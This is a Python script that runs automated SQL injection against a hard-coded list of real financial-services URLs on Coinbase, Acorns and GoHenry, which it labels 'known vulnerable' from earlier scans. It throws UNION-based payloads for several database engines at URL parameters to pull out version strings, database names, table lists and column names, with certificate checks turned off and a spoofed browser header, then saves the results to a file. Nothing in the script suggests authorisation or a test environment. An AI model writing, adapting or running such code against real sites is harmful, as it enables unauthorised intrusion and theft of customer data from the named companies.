#!/usr/bin/env python3

import requests
import time
import json
import re
from urllib.parse import quote, unquote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ManualDatabaseExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Known vulnerable URLs from previous scans
        self.vulnerable_urls = [
            'https://coinbase.com/user?id=1',
            'https://coinbase.com/profile?id=1', 
            'https://coinbase.com/search?q=test',
            'https://www.acorns.com/learn/search/?q=invest',
            'https://www.acorns.com/learn/?page=3',
            'https://www.acorns.com/learn/search/?p=3&q=invest',
            'https://www.acorns.com/support/search/?q=password',
            'https://www.gohenry.com/us/terms-and-conditions/?q=test'
        ]
        
        self.extracted_data = []
    
    def extract_database_manual(self, url):
        """Manual database extraction using various techniques"""
        print(f"[+] Manual extraction from {url}")
        
        # Extract database version
        version_info = self.extract_version(url)
        if version_info:
            print(f"  [+] Database version: {version_info}")
        
        # Extract current database
        current_db = self.extract_current_database(url)
        if current_db:
            print(f"  [+] Current database: {current_db}")
        
        # Extract database list
        databases = self.extract_database_list(url)
        if databases:
            print(f"  [+] Databases found: {databases}")
        
        # Extract table list
        tables = self.extract_table_list(url, current_db or 'information_schema')
        if tables:
            print(f"  [+] Tables found: {tables}")
        
        # Extract column list
        columns = self.extract_column_list(url, tables[0] if tables else 'users')
        if columns:
            print(f"  [+] Columns found: {columns}")
        
        if version_info or current_db or databases or tables or columns:
            return {
                'url': url,
                'method': 'Manual Extraction',
                'version': version_info,
                'current_database': current_db,
                'databases': databases,
                'tables': tables,
                'columns': columns,
                'success': True
            }
        
        return None
    
    def extract_version(self, url):
        """Extract database version"""
        version_payloads = [
            # MySQL
            "' UNION SELECT @@version-- ",
            "' UNION SELECT version()-- ",
            "' AND (SELECT SUBSTRING(@@version,1,10))-- ",
            
            # PostgreSQL
            "' UNION SELECT version()-- ",
            
            # SQL Server
            "' UNION SELECT @@version-- ",
            
            # Oracle
            "' UNION SELECT banner FROM v$version-- ",
            
            # SQLite
            "' UNION SELECT sqlite_version()-- "
        ]
        
        for payload in version_payloads:
            try:
                test_url = self.inject_payload(url, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Look for version patterns
                version_patterns = [
                    r'MySQL.*?(\d+\.\d+\.\d+)',
                    r'PostgreSQL.*?(\d+\.\d+)',
                    r'Microsoft SQL Server.*?(\d+\.\d+)',
                    r'Oracle.*?(\d+\.\d+)',
                    r'SQLite.*?(\d+\.\d+\.\d+)'
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        return match.group(0)
                        
            except:
                continue
        
        return None
    
    def extract_current_database(self, url):
        """Extract current database name"""
        db_payloads = [
            # MySQL
            "' UNION SELECT database()-- ",
            "' UNION SELECT schema()-- ",
            
            # PostgreSQL
            "' UNION SELECT current_database()-- ",
            
            # SQL Server
            "' UNION SELECT db_name()-- ",
            
            # Oracle
            "' UNION SELECT sys_context('userenv','current_schema') FROM dual-- "
        ]
        
        for payload in db_payloads:
            try:
                test_url = self.inject_payload(url, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Look for database name patterns
                db_patterns = [
                    r'database["\']?\s*:\s*["\']?([a-zA-Z_][a-zA-Z0-9_]*)',
                    r'schema["\']?\s*:\s*["\']?([a-zA-Z_][a-zA-Z0-9_]*)',
                    r'current_database["\']?\s*:\s*["\']?([a-zA-Z_][a-zA-Z0-9_]*)'
                ]
                
                for pattern in db_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        return match.group(1)
                        
            except:
                continue
        
        return None
    
    def extract_database_list(self, url):
        """Extract list of databases"""
        db_list_payloads = [
            # MySQL
            "' UNION SELECT schema_name FROM information_schema.schemata-- ",
            "' UNION SELECT DISTINCT(db) FROM mysql.db-- ",
            
            # PostgreSQL
            "' UNION SELECT datname FROM pg_database-- ",
            
            # SQL Server
            "' UNION SELECT name FROM master.dbo.sysdatabases-- ",
            
            # Oracle
            "' UNION SELECT username FROM all_users-- "
        ]
        
        databases = []
        
        for payload in db_list_payloads:
            try:
                test_url = self.inject_payload(url, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Extract database names
                db_names = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', response.text)
                for db in db_names:
                    if db.lower() not in ['null', 'none', 'error', 'warning', 'info', 'debug']:
                        databases.append(db)
                        
            except:
                continue
        
        return list(set(databases))
    
    def extract_table_list(self, url, database):
        """Extract list of tables from a database"""
        table_payloads = [
            # MySQL
            f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'-- ",
            f"' UNION SELECT table_name FROM information_schema.tables-- ",
            
            # PostgreSQL
            f"' UNION SELECT tablename FROM pg_tables WHERE schemaname='{database}'-- ",
            f"' UNION SELECT tablename FROM pg_tables-- ",
            
            # SQL Server
            f"' UNION SELECT name FROM {database}.sys.tables-- ",
            "' UNION SELECT name FROM sysobjects WHERE xtype='U'-- ",
            
            # Oracle
            f"' UNION SELECT table_name FROM all_tables WHERE owner='{database}'-- ",
            "' UNION SELECT table_name FROM user_tables-- "
        ]
        
        tables = []
        
        for payload in table_payloads:
            try:
                test_url = self.inject_payload(url, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Extract table names
                table_names = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', response.text)
                for table in table_names:
                    if table.lower() not in ['null', 'none', 'error', 'warning', 'info', 'debug']:
                        tables.append(table)
                        
            except:
                continue
        
        return list(set(tables))
    
    def extract_column_list(self, url, table):
        """Extract list of columns from a table"""
        column_payloads = [
            # MySQL
            f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- ",
            
            # PostgreSQL
            f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- ",
            
            # SQL Server
            f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- ",
            
            # Oracle
            f"' UNION SELECT column_name FROM all_tab_columns WHERE table_name='{table}'-- "
        ]
        
        columns = []
        
        for payload in column_payloads:
            try:
                test_url = self.inject_payload(url, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Extract column names
                column_names = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', response.text)
                for column in column_names:
                    if column.lower() not in ['null', 'none', 'error', 'warning', 'info', 'debug']:
                        columns.append(column)
                        
            except:
                continue
        
        return list(set(columns))
    
    def inject_payload(self, url, payload):
        """Inject payload into URL"""
        # URL encode the payload
        encoded_payload = quote(payload)
        
        # Try different injection points
        if '?id=' in url:
            return url.replace('?id=1', f'?id={encoded_payload}')
        elif '?q=' in url:
            return url.replace('?q=test', f'?q={encoded_payload}')
        elif '?query=' in url:
            return url.replace('?query=test', f'?query={encoded_payload}')
        elif '?page=' in url:
            return url.replace('?page=3', f'?page={encoded_payload}')
        elif '?p=' in url:
            return url.replace('?p=3', f'?p={encoded_payload}')
        else:
            return url + encoded_payload
    
    def run_manual_extraction(self):
        """Run manual extraction on all vulnerable URLs"""
        print("=== MANUAL DATABASE EXTRACTION ===")
        
        successful_extractions = 0
        
        for url in self.vulnerable_urls:
            if successful_extractions >= 5:
                break
                
            print(f"\n[+] Processing: {url}")
            result = self.extract_database_manual(url)
            
            if result:
                self.extracted_data.append(result)
                successful_extractions += 1
                print(f"[!] SUCCESS #{successful_extractions}: Manual extraction successful!")
        
        # Save results
        with open('manual_extraction_results.json', 'w') as f:
            json.dump(self.extracted_data, f, indent=2)
        
        print(f"\n=== MANUAL EXTRACTION COMPLETE ===")
        print(f"Successfully extracted from {len(self.extracted_data)} URLs")
        
        return self.extracted_data

if __name__ == "__main__":
    extractor = ManualDatabaseExtractor()
    results = extractor.run_manual_extraction()
    
    print("\n=== MANUAL EXTRACTION RESULTS ===")
    for i, result in enumerate(results, 1):
        print(f"\n{i}. URL: {result['url']}")
        print(f"   Version: {result.get('version', 'N/A')}")
        print(f"   Current DB: {result.get('current_database', 'N/A')}")
        print(f"   Databases: {result.get('databases', [])}")
        print(f"   Tables: {result.get('tables', [])}")
        print(f"   Columns: {result.get('columns', [])}")
